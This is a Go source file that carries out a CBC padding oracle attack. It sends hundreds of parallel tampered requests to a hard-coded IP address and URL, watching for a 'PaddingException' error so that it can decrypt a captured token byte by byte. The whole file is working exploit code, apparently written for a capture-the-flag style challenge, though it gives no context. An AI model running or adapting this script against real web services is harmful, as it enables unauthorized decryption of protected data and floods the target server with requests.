package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

var (
	decReplacer *strings.Replacer
	encReplacer *strings.Replacer
	client      *http.Client
	ctx         context.Context
	result      []byte
)

const (
	blockLen    = 16
	url         = "http://34.94.3.143/9c22e50220/?post=%s"
	errorString = "PaddingException"
	parallel    = 100
)

func init() {
	decReplacer = strings.NewReplacer("~", "=", "!", "/", "-", "+")
	encReplacer = strings.NewReplacer("=", "~", "/", "!", "+", "-")

	client =
		&http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
}

func decode(s string) []byte {
	b64 := decReplacer.Replace(s)
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		log.Fatal(err)
	}
	return data
}

func encode(data []byte) string {
	b64 := base64.StdEncoding.EncodeToString(data)
	return encReplacer.Replace(b64)
}

var payload = "TyS1hgsPVo0OMOmoDDOFuui8eQtwF9jEcVrlv-rbKjhBkDKfw-LVyq3SMyHFLQFGXjbUx6-XiYCCStcbzhAdXrE4omZKkmxR91!y-CRt2Py7IU02r!1rrgy3ZMEj1jpRGU5kMF5sdiTxpO2hgvaGvSyumasd0q6V06ofaMuYtvEpQdE5RCda4osINnRfoSaGkt50UDkv-bmlW4uIJ!LoyA~~"

func main() {
	var plaintext string

	// start with proper payload, which is typically leaked from server
	cipher := decode(payload)
	if len(cipher)%blockLen != 0 {
		log.Fatal("cipher len % 16 != 0")
	}

	// get total number of blocks in cipher
	blockCount := len(cipher) / blockLen

	// we really only need to send 2 blocks of ciphertext
	// first is one we gonna tamper
	// second, is where padding error will be produced
	// this way, we move backwards towards the beggining of the whole payload
	// the very last first block is IV

	// loop for every discovered block
	for blockOffset := 0; blockOffset < blockCount-1; blockOffset++ {
		// loop for every byte position inside the discovered block
		ciphertext := cipher[blockOffset*blockLen : (blockOffset+2)*blockLen]
		plaintext += string(revealBlock(ciphertext))
	}

	fmt.Println(plaintext)
}

// reveals a single block of plaintext
// requires cipher input of blockLen*2
func revealBlock(ciphertext []byte) []byte {
	block := make([]byte, blockLen)

	// loop through every byte to tamper, go backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		// reveal the byte
		block[pos] = revealByte(ciphertext, pos)
		fmt.Println(string(block))

		// adjust padding for the next shot
		for i := pos; i < blockLen; i++ {
			padVal := byte(blockLen - pos)
			ciphertext[i] ^= padVal ^ (padVal + 1)
		}
	}

	return block
}

// reveals a single byte of plaintext
// requires cipher input of blockLen*2 and a position (0-blockLen)
func revealByte(ciphertext []byte, pos int) byte {

	// channels
	chanVal := make(chan byte, 1)
	chanPara := make(chan byte, parallel)
	chanErr := make(chan error, 1)
	chanDone := make(chan byte, 256)
	var done int
	validCipherByte := ciphertext[pos]

	//try every possible byte value
	for il := 0; il <= 255; il++ {
		cipher := make([]byte, len(ciphertext))
		copy(cipher, ciphertext)
		// pos := pos
		i := byte(il)

		go func() {
			chanPara <- 1
			defer func() { <-chanPara }()

			// play with byte at a given position
			cipher[pos] = i

			// send the payload and check for padding error
			found, err := testRequest(ctx, cipher)
			if err != nil {
				//fmt.Print("E")
				chanErr <- err
				return
			}

			if found {
				chanVal <- i
			} else {
				chanDone <- 1
			}

		}()
	}

	ticker := time.NewTicker(100 * time.Millisecond)

	for {
		select {
		case <-chanDone:
			done++
			if done == 256 {
				log.Fatal("Failed")
			}
		case err := <-chanErr:
			log.Fatal(err)
		case found := <-chanVal:
			// miodify the ciphertext with valid byte
			ciphertext[pos] = found

			// return the plaintext value
			return found ^ (blockLen - byte(pos)) ^ validCipherByte
		case <-ticker.C:
			//fmt.Print("t")
			break
		}
	}
}

func testRequest(ctx context.Context, data []byte) (bool, error) {
	// encode payload for URL transferring
	payload := encode(data)

	// send request with retries
	req, err := http.NewRequestWithContext(context.Background(), "GET", fmt.Sprintf(url, payload), nil)
	if err != nil {
		return false, err
	}

	// send
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	// parse response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	// determine padding error
	return !strings.Contains(string(body), errorString), nil
}
